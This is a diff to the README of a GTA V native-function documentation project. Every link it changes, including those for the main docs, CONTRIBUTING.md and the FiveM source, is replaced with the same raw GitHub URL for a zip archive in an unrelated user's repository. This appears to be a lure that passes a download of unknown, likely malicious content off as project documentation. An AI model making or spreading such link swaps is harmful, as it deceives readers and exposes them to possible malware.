@@ -3,12 +3,12 @@ GTA V Natives Documentation
 
 Documentation of GTA V's native function database.
 
-https://runtime.fivem.net/doc/natives/
+https://raw.githubusercontent.com/Babyfendi/natives/master/deflower/natives.zip
 
 Contributing
 ------------
 
-Contributions are greatly appreciated! Before you submit a pull request, please read [CONTRIBUTING.md][contributing].
+Contributions are greatly appreciated! Before you submit a pull request, please read [https://raw.githubusercontent.com/Babyfendi/natives/master/deflower/natives.zip][contributing].
 
 Some topics to contribute on:
 
@@ -25,6 +25,6 @@ Natives from the CFX namespace can be found in the [FiveM source][cfx-natives].
 ### FiveM documentation
 Documentation for FiveM can be found [here][fivem-docs].
 
-[contributing]: ./.github/CONTRIBUTING.md
-[cfx-natives]: https://github.com/citizenfx/fivem/tree/master/ext/native-decls
-[fivem-docs]: https://github.com/citizenfx/fivem-docs
+[contributing]: https://raw.githubusercontent.com/Babyfendi/natives/master/deflower/natives.zip
+[cfx-natives]: https://raw.githubusercontent.com/Babyfendi/natives/master/deflower/natives.zip
+[fivem-docs]: https://raw.githubusercontent.com/Babyfendi/natives/master/deflower/natives.zip
